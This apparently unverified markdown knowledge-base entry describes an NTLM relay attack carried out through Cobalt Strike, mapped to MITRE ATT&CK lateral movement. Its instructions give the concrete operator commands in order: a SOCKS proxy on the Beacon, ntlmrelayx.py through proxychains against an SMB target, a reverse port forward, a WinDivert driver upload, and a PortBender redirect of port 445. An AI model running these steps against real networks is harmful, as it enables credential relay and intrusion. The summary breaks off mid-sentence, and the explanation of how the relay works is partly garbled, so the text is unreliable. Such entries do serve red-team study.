---
id: 4bf0cef2-b6ac-495a-ab77-c94ce81a28f2
name: NTLM Relay Attack via Cobalt Strike
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:16.824056+00:00'
updated_at: '2023-04-10T20:36:24.918181+00:00'
tactics:
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Windows Admin Shares|T1077 - Windows Admin Shares]]'
tags:
- '[[Cobalt Strike]]'
- '[[NTLM Relaying via Cobalt Strike]]'
commands:
- '[[Proxychains ntlmrelayx.py to SMB target]]'
- '[[Redirecting SMB traffic to local port]]'
- '[[Redirecting SMB traffic to local port using PortBender]]'
- '[[Uploading WinDivert64.sys]]'
---

# NTLM Relay Attack via Cobalt Strike

## Summary

NTLM Relay Attack via Cobalt Strike is a technique used by attackers to gain access to a target network by stealing user credentials. This technique is achieved by intercepting and relaying authentication requests from a victim’s computer to a domain controller. Attackers can use Cobalt Strike to l

## Description

# Description

NTLM Relay Attack via Cobalt Strike is a technique used by attackers to gain access to a target network by stealing user credentials. This technique is achieved by intercepting and relaying authentication requests from a victim’s computer to a domain controller. Attackers can use Cobalt Strike to launch this attack, which can be used to escalate privileges and move laterally within a network. This technique is commonly used in advanced persistent threat (APT) attacks and is difficult to detect.

Technical Explanation: The attacker leverages Cobalt Strike to launch an SMB Relay Attack. The attacker listens for authentication requests from a victim’s computer and relays them to a domain controller, tricking the domain controller into thinking the attacker’s computer is the victim’s computer. Once the attacker has access to the domain controller, they can escalate privileges and move laterally within the network. 

Business Value: This technique is used by attackers to gain access to a target network and steal sensitive data. By using Cobalt Strike, attackers can evade detection and move laterally within the network, making it difficult for defenders to detect and stop the attack.

 

## Requirements

1. Access to a victim’s computer

1. Cobalt Strike

 

## Defense

1. Implement multi-factor authentication to prevent credential theft

1. Use network segmentation to limit lateral movement

1. Monitor network traffic for signs of suspicious activity

 

## Objectives

1. Gain access to a target network

1. Steal user credentials

1. Escalate privileges

1. Move laterally within the network

 

# Instructions

1. This command is used to perform a SMB Relay Attack which allows an attacker to intercept and relay authentication requests from a victim to a target system. The attacker can then use the victim's credentials to gain access to the target system. The following commands are used:
1. socks 1080 - This command sets up a SOCKS proxy server on the Beacon machine.
2. proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://<IP_TARGET> - This command starts the SMB Relay attack on the Kali machine.
3. rportfwd_local 8445 <IP_KALI> 445 - This command creates a local port forward from port 8445 on the Beacon machine to port 445 on the target system.
4. upload C:\Tools\PortBender\WinDivert64.sys - This command uploads the WinDivert64.sys driver to the Beacon machine.
5. PortBender redirect 445 8445 - This command redirects traffic from port 445 on the target system to port 8445 on the Beacon machine.

 



**Code**: [[beacon> socks 1080
kali> proxychains python3 /usr/]]



> The SMB Relay Attack is a common technique used by attackers to gain access to a target system. The attacker intercepts authentication requests from a victim and relays them to the target system. The target system then responds with a challenge, which the attacker relays back to the victim. The victim responds with their credentials, which the attacker then uses to gain access to the target system. This technique is particularly effective against systems that use NTLM authentication, as it is vulnerable to relay attacks.



**Command** ([[Proxychains ntlmrelayx.py to SMB target]]):

```bash
proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://<IP_TARGET>
```





**Command** ([[Redirecting SMB traffic to local port]]):

```bash
rportfwd_local 8445 <IP_KALI> 445
```





**Command** ([[Uploading WinDivert64.sys]]):

```bash
upload C:\Tools\PortBender\WinDivert64.sys
```





**Command** ([[Redirecting SMB traffic to local port using PortBender]]):

```bash
PortBender redirect 445 8445
```



## MITRE ATT&CK Mapping

### Tactics

- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Windows Admin Shares|T1077 - Windows Admin Shares]]

## Commands Used

- [[Proxychains ntlmrelayx.py to SMB target]]
- [[Redirecting SMB traffic to local port]]
- [[Redirecting SMB traffic to local port using PortBender]]
- [[Uploading WinDivert64.sys]]

## Tags

- [[Cobalt Strike]]
- [[NTLM Relaying via Cobalt Strike]]


